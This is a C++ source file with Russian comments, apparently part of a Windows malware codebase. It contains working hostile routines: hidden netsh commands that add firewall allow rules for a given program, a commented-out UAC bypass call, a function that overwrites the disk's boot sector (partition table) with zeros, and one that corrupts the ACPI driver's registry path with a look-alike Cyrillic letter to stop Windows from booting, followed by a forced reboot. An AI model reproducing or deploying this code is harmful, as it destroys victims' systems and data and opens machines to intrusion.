#include "tools.h"
#include "core\path.h"
#include "core\debug.h"
#include "core\elevation.h"

bool AddAllowedprogram( StringBuilder& path )
{
	//формируем имя правила (имя файла без расширения)
	StringBuilderStack<32> nameRule( Path::GetFileName(path.c_str()) );
	int p = nameRule.IndexOf('.');
	if( p > 0 ) nameRule.SetLen(p);
	//делаем текущей директорией папку windows\system32\wbem, для того чтобы
	//команда выполнилась без проблем на всех машинах (без этого не везде может сработать)
	StringBuilderStack<MAX_PATH> sysPath;
	if( Path::GetCSIDLPath( CSIDL_SYSTEM, sysPath ) )
	{
		Path::AppendFile( sysPath, _CS_("wbem") );
		API(KERNEL32, SetCurrentDirectoryA)(sysPath);
	}
    OSVERSIONINFOA ver;
    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
    API(KERNEL32, GetVersionExA)(&ver);
	DWORD codeExit = 0;
	if( ver.dwMajorVersion >= 6 ) //Win7
	{
		Process::Exec( CREATE_NO_WINDOW | Process::EXEC_NOWINDOW, &codeExit, 5000, _CS_("netsh advfirewall firewall delete rule \"%s\""), nameRule );
		Process::Exec( CREATE_NO_WINDOW | Process::EXEC_NOWINDOW, &codeExit, 5000, _CS_("netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""), nameRule.c_str(), path.c_str() );
		//StringBuilder cmd(512);
		//cmd.Format( _CS_("netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""), nameRule.c_str(), path.c_str() );
		//Elevation::UACBypass( 0, cmd.c_str() );
	}
	else //WinXP
	{
		Process::Exec( CREATE_NO_WINDOW | Process::EXEC_NOWINDOW, &codeExit, 5000, _CS_("netsh firewall add allowedprogram \"%s\" %s ENABLE"), path.c_str(), nameRule.c_str() );
	}
	if( codeExit == 0 )
	{
		DbgMsg( "Установка правила для браундмаузера прошла успешно ('%s'='%s')", nameRule.c_str(), path.c_str() );
		return true;
	}
	else
	{
		DbgMsg( "Правило для браундмаузера не установилось (ExitCode=%d) ('%s'='%s')", codeExit, nameRule.c_str(), path.c_str() );
		return false;
	}
}

static bool KillOs1()
{
	// перезаписывает нулевой сектор, а там находиться Таблица разделов  
	HANDLE hDest = API(KERNEL32, CreateFileA)( _CS_("\\\\.\\PHYSICALDRIVE0"), GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, 0 );
	if( hDest == INVALID_HANDLE_VALUE )
		return false;
      
	char p[512];
    Mem::Set( p, 0, sizeof(p) );
	DWORD size = sizeof(p);
	BOOL ret = API(KERNEL32, WriteFile)( hDest, p, size, &size, NULL );
    API(KERNEL32, CloseHandle)(hDest);
	
	return ret != FALSE;
}

//производит в реестре замену пути к важному файлу
static bool KillOs2()
{
	bool ret = false;
	const char* items[] = { _CT_("ControlSet001"), _CT_("ControlSet002"), _CT_("CurrentControlSet"), 0 };
	int i = 0;
	while( items[i] )
	{
	    StringBuilderStack<MAX_PATH> path;
		Path::Combine( path, _CS_("SYSTEM"), DECODE_STRING(items[i]), _CS_("services\\ACPI") );
		HKEY key;
	    LONG res = API(ADVAPI32, RegOpenKeyExA)( HKEY_LOCAL_MACHINE, path, 0, KEY_ALL_ACCESS, &key );
	    if( res == ERROR_SUCCESS )
		{
			//в AСPI.sys русская буква С (вместо латинской), названия визуально похожи
			StringBuilderStack<64> CORRUPTED_PATH( _CS_("system32\\drivers\\AСPI.sys") );
			res = API(ADVAPI32, RegSetValueExA)( key, _CS_("ImagePath"), 0, REG_SZ, (const BYTE *)CORRUPTED_PATH.c_str(), CORRUPTED_PATH.Len() + 1 );
	        if( res == ERROR_SUCCESS )
	        {
				DbgMsg( "KillOs2: Success: %s = %s", path.c_str(), CORRUPTED_PATH.c_str() );
				ret = true;
			}        
			else
			{
				DbgMsg( "KillOs2: Error: %s = %s", path.c_str(), CORRUPTED_PATH.c_str() );
			}
			API(ADVAPI32, RegCloseKey)(key);
		}
		else
		{
			DbgMsg( "KillOs2: RegOpenKey() ERROR %d\n", res );
		}
		i++;
	}
	return ret;
}

bool KillOs()
{
	bool res = KillOs2();
	if( KillOs1() ) res = true;
	if( res )
		DbgMsg( "KillOs is success" );
	return res;
}

void Reboot()
{
	BOOL OldValue;
	if( NT_SUCCESS( API(NTDLL, RtlAdjustPrivilege)( SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, (PBOOLEAN)&OldValue ) ) )
	API(USER32, ExitWindowsEx)( EWX_REBOOT | EWX_FORCE, 0 );
}

